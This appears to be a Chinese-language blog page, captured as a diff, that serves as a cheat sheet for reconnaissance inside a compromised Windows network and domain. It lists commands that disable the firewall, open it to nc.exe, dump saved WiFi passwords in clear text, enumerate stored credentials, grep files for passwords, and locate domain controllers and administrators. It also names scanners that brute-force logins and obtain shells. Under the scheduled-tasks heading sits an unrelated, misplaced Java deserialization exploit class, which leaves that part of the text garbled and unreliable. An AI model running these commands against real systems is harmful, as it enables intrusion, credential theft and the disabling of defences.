@@ -1,0 +1,1094 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="内网渗透信息收集, InBlog">
+    <meta name="description" content="本地信息收集收集网卡信息ipconfig
+收集电脑版本和补丁systeminfo
+查看系统体系结构(X86,AMD64)echo %PROCESSOR_ARCHITECTURE%d
+查看安装的软件和版本wmic product get na">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网渗透信息收集 | InBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">InBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">InBlog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网渗透信息收集</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-11-11
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h1><h4 id="收集网卡信息"><a href="#收集网卡信息" class="headerlink" title="收集网卡信息"></a>收集网卡信息</h4><p><code>ipconfig</code></p>
+<h4 id="收集电脑版本和补丁"><a href="#收集电脑版本和补丁" class="headerlink" title="收集电脑版本和补丁"></a>收集电脑版本和补丁</h4><p><code>systeminfo</code></p>
+<h4 id="查看系统体系结构-X86-AMD64"><a href="#查看系统体系结构-X86-AMD64" class="headerlink" title="查看系统体系结构(X86,AMD64)"></a>查看系统体系结构(X86,AMD64)</h4><p><code>echo %PROCESSOR_ARCHITECTURE%</code>d</p>
+<h4 id="查看安装的软件和版本"><a href="#查看安装的软件和版本" class="headerlink" title="查看安装的软件和版本"></a>查看安装的软件和版本</h4><p><code>wmic product get name,version</code></p>
+<p><code>powershell &quot;Get-WmiObject -class win32_product | Select-Object -Property name,version&quot;</code>			</p>
+<h4 id="本机运行的服务"><a href="#本机运行的服务" class="headerlink" title="本机运行的服务"></a>本机运行的服务</h4><p><code>wmic service list brief</code>											</p>
+<h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h4><p><code>tasklist</code>、<code>wmic process list brief</code></p>
+<h4 id="查看自启程序"><a href="#查看自启程序" class="headerlink" title="查看自启程序"></a>查看自启程序</h4><p><code>wmic startup get command,caption</code></p>
+<h4 id="查看计划任务-如果提示无法加载资源-输入chcp-437"><a href="#查看计划任务-如果提示无法加载资源-输入chcp-437" class="headerlink" title="查看计划任务(如果提示无法加载资源,输入chcp 437)"></a>查看计划任务(如果提示无法加载资源,输入chcp 437)</h4><p>xxxxxxxxxx package com.ezgame.ctf.tools;​import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;​public class EXP {    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException {        ToStringBean toStringBean &#x3D; new ToStringBean();        Field declaredField &#x3D; toStringBean.getClass().getDeclaredField(“ClassByte”);        declaredField.setAccessible(true);​        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(“D:\桌面\note\ClassLoaderTest.class\“));        declaredField.set(toStringBean, bytes);​        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传​        Field declaredField1 &#x3D; badAttributeValueExpException.getClass().getDeclaredField(“val”);        declaredField1.setAccessible(true);        declaredField1.set(badAttributeValueExpException, toStringBean);​        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeUTF(“gadgets”);        objectOutputStream.writeInt(2021);        objectOutputStream.writeObject(badAttributeValueExpException);​        byte[] byteArray &#x3D; byteArrayOutputStream.toByteArray();        String bytes1 &#x3D; Tools.base64Encode(byteArray);        System.out.println(bytes1);    }​}Java</p>
+<h4 id="查看开机时间"><a href="#查看开机时间" class="headerlink" title="查看开机时间"></a>查看开机时间</h4><p><code>net statistics workstation</code></p>
+<h4 id="用户列表信息"><a href="#用户列表信息" class="headerlink" title="用户列表信息"></a>用户列表信息</h4><p><code>wmic useraccount get name,SID</code>、<code>net user</code></p>
+<h4 id="查询端口信息"><a href="#查询端口信息" class="headerlink" title="查询端口信息"></a>查询端口信息</h4><p><code>netstat -ano</code> </p>
+<h4 id="查询补丁信息"><a href="#查询补丁信息" class="headerlink" title="查询补丁信息"></a>查询补丁信息</h4><p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code>、<code>systeminfo</code></p>
+<h4 id="查询杀软信息"><a href="#查询杀软信息" class="headerlink" title="查询杀软信息"></a>查询杀软信息</h4><p><code>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</code></p>
+<h4 id="查询共享列表"><a href="#查询共享列表" class="headerlink" title="查询共享列表"></a>查询共享列表</h4><p><code>wmic share get name,path,status</code>、<code>net share</code></p>
+<h4 id="查询路由信息"><a href="#查询路由信息" class="headerlink" title="查询路由信息"></a>查询路由信息</h4><p><code>route print</code></p>
+<h4 id="查询是否开启防火墙"><a href="#查询是否开启防火墙" class="headerlink" title="查询是否开启防火墙"></a>查询是否开启防火墙</h4><p><code>netsh firewall show state</code></p>
+<h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows server 2003: 	<code>netsh firewall set opmode disable</code></p>
+<p>Windows server 2003之后: <code>netsh firewall set opmode disable</code> 或者<code>etsh advfirewall set allprofiles state off</code></p>
+<h4 id="指定连接"><a href="#指定连接" class="headerlink" title="指定连接"></a>指定连接</h4><p>2003及之前的版本,允许指定的程序进行全部的连接</p>
+<p><code>netsh firewall add allowedprogram c:\nc.exe &quot;allownc&quot; enable</code></p>
+<p>2003之后的版本，允许指定的程序进行全部的连接</p>
+<p><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot;dir=in action=allow program=&quot;C:\nc.exe&quot; </code></p>
+<p>允许指定程序退出,命令如下</p>
+<p><code>netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot; </code></p>
+<p>允许3389端口放行,命令如下</p>
+<p><code>netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p>
+<h4 id="收集本机的WIFI密码信息"><a href="#收集本机的WIFI密码信息" class="headerlink" title="收集本机的WIFI密码信息"></a>收集本机的WIFI密码信息</h4><p><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></p>
+<h4 id="查询RDP端口"><a href="#查询RDP端口" class="headerlink" title="查询RDP端口"></a>查询RDP端口</h4><p><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; /V PortNumber</code></p>
+<h4 id="查询当前保存的凭据"><a href="#查询当前保存的凭据" class="headerlink" title="查询当前保存的凭据"></a>查询当前保存的凭据</h4><p><code>cmdkey /l</code></p>
+<h4 id="arp信息"><a href="#arp信息" class="headerlink" title="arp信息"></a>arp信息</h4><p><code>arp -a</code></p>
+<h4 id="查询最近打开的文件"><a href="#查询最近打开的文件" class="headerlink" title="查询最近打开的文件"></a>查询最近打开的文件</h4><p><code>dir %APPDATA%\Microsoft\Windows\Recent</code></p>
+<h4 id="查询本地工作组"><a href="#查询本地工作组" class="headerlink" title="查询本地工作组"></a>查询本地工作组</h4><p><code>net localgroup</code></p>
+<h4 id="查询管理员组员信息"><a href="#查询管理员组员信息" class="headerlink" title="查询管理员组员信息"></a>查询管理员组员信息</h4><p><code>net localgroup administrators(组名)</code></p>
+<h4 id="查询RDP凭据"><a href="#查询RDP凭据" class="headerlink" title="查询RDP凭据"></a>查询RDP凭据</h4><p><code>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code></p>
+<h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h4 id="查询是否为域用户"><a href="#查询是否为域用户" class="headerlink" title="查询是否为域用户"></a>查询是否为域用户</h4><p><code>hostname</code>查看机器名,<code>whoami</code>命令搭配<code>hostname</code>可以查看是否是域用户</p>
+<h4 id="判断域存在"><a href="#判断域存在" class="headerlink" title="判断域存在"></a>判断域存在</h4><pre class="language-none"><code class="language-none">ipconfig &#x2F;all
+systeminfo
+net config workstation
+net time &#x2F;domain</code></pre>
+
+<h4 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h4><p><code>net view/domain:域名</code></p>
+<h4 id="查询域内所有用户组列表"><a href="#查询域内所有用户组列表" class="headerlink" title="查询域内所有用户组列表"></a>查询域内所有用户组列表</h4><p><code>net group /domain</code></p>
+<h4 id="查询组内所有域成员计算机列表"><a href="#查询组内所有域成员计算机列表" class="headerlink" title="查询组内所有域成员计算机列表"></a>查询组内所有域成员计算机列表</h4><p><code>net group &quot;domain computers&quot; /domain</code></p>
+<h4 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h4><p><code>nltest /domain_trusts</code></p>
+<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p><code>ping 域控制器名.域名</code>命令获取</p>
+<p><code>ping dc.test.local</code></p>
+<h4 id="查看域控制器机器名"><a href="#查看域控制器机器名" class="headerlink" title="查看域控制器机器名"></a>查看域控制器机器名</h4><p><code>nltest /DCLIST:(域名)</code></p>
+<p><code>nslookup -type=SRV _ldap._tcp</code></p>
+<p><code>net time /domain</code></p>
+<h4 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h4><p><code>net group &quot;Domain Controllers&quot; /domain</code></p>
+<h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><h4 id="查询远程计算机上当前已登录用户"><a href="#查询远程计算机上当前已登录用户" class="headerlink" title="查询远程计算机上当前已登录用户"></a>查询远程计算机上当前已登录用户</h4><p><code>PsLoggedon.exe -l \\远程计算机名</code></p>
+<h4 id="显示域中所有计算机上当前登陆的所有用户"><a href="#显示域中所有计算机上当前登陆的所有用户" class="headerlink" title="显示域中所有计算机上当前登陆的所有用户"></a>显示域中所有计算机上当前登陆的所有用户</h4><p><code>PVEFindADUser.exe -current</code></p>
+<h4 id="找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户"><a href="#找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户" class="headerlink" title="找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户"></a>找寻登录会话、找寻共享、枚举登录的用户、查询共享入口和有价值的用户</h4><p><code>netview.exe -d</code></p>
+<h3 id="敏感数据定位"><a href="#敏感数据定位" class="headerlink" title="敏感数据定位"></a>敏感数据定位</h3><pre class="language-none"><code class="language-none">1.指定目录下搜集各类敏感文件
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.txt&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.xml&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdb&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.sql&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.mdf&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.eml&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*.pst&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*conf*&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*bak*&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pwd*&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*pass*&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*login*&quot;
+dir &#x2F;a &#x2F;s &#x2F;b d:\&quot;*user*&quot;
+2.指定目录下的文件中搜集各种账号密码
+findstr &#x2F;s &#x2F;i &quot;pass&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
+findstr &#x2F;s &#x2F;i &quot;user&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
+findstr &#x2F;s &#x2F;i &quot;pwd&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
+findstr &#x2F;s &#x2F;i &quot;login&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
+findstr &#x2F;s &#x2F;i &quot;user&quot; *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</code></pre>
+
+
+
+<h3 id="内网IP扫描"><a href="#内网IP扫描" class="headerlink" title="内网IP扫描"></a>内网IP扫描</h3><h4 id="批量ping-C段命令"><a href="#批量ping-C段命令" class="headerlink" title="批量ping C段命令"></a>批量ping C段命令</h4><pre class="language-none"><code class="language-none">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL&#x3D;“</code></pre>
+
+<h4 id="fping工具"><a href="#fping工具" class="headerlink" title="fping工具"></a>fping工具</h4><pre class="language-none"><code class="language-none">fping IP1 IP2 -c 10 扫描多个IP 10次
+fping -a -g 172.18.9.0&#x2F;24 扫描C端IP</code></pre>
+
+<h4 id="Arp批量扫描"><a href="#Arp批量扫描" class="headerlink" title="Arp批量扫描"></a>Arp批量扫描</h4><pre class="language-none"><code class="language-none">Apr.exe -t IP段
+Apr.exe -t 192.168.1.0&#x2F;24</code></pre>
+
+<h4 id="NETBIOS协议扫描"><a href="#NETBIOS协议扫描" class="headerlink" title="NETBIOS协议扫描"></a>NETBIOS协议扫描</h4><pre class="language-none"><code class="language-none">nbtscan.exe + IP段
+nbtscan.exe + 192.16.1.0&#x2F;24</code></pre>
+
+<h4 id="Fscan扫描"><a href="#Fscan扫描" class="headerlink" title="Fscan扫描"></a>Fscan扫描</h4><h4 id="Kscan扫描"><a href="#Kscan扫描" class="headerlink" title="Kscan扫描"></a>Kscan扫描</h4><pre class="language-none"><code class="language-none">可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在
+不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴
+力破解，且是go平台首款开源的RDP暴力破解工具</code></pre>
+
+<h4 id="Lodon大型扫描器"><a href="#Lodon大型扫描器" class="headerlink" title="Lodon大型扫描器"></a>Lodon大型扫描器</h4><pre class="language-none"><code class="language-none">Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密
+码爆破、高危漏洞检测以及一键GetShell，支持批量A段&#x2F;B段&#x2F;C段以及跨网段扫描，支持URL、主机、
+域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络
+存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、
+开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、
+Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、
+Windows(LDAP、SMB&#x2F;IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、
+Weblogic、Rar等，远程执行命令包含(wmiexe&#x2F;psexec&#x2F;atexec&#x2F;sshexec&#x2F;jspshell),Web指纹识别模块可
+识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、
+DLL(C#&#x2F;Delphi&#x2F;VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，
+EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网
+进行横向移动。</code></pre>
+
+<h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><h4 id="ScanLine工具扫描"><a href="#ScanLine工具扫描" class="headerlink" title="ScanLine工具扫描"></a>ScanLine工具扫描</h4><h4 id="Telnet协议扫描"><a href="#Telnet协议扫描" class="headerlink" title="Telnet协议扫描"></a>Telnet协议扫描</h4><pre class="language-none"><code class="language-none">telnet + IP+端口</code></pre>
+
+<h4 id="Fsacn、Kscan等"><a href="#Fsacn、Kscan等" class="headerlink" title="Fsacn、Kscan等"></a>Fsacn、Kscan等</h4>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doramer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://doramer.github.io/2024/11/11/2024-09-29-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">https://doramer.github.io/2024/11/11/2024-09-29-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doramer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2024/11/11/2024-10-01-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="密码抓取">
+                        
+                        <span class="card-title">密码抓取</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Doramer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/11/11/2024-09-28-%E5%86%85%E7%BD%91%E5%9F%9F%E7%9F%A5%E8%AF%86/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="内网域知识">
+                        
+                        <span class="card-title">内网域知识</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Doramer
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
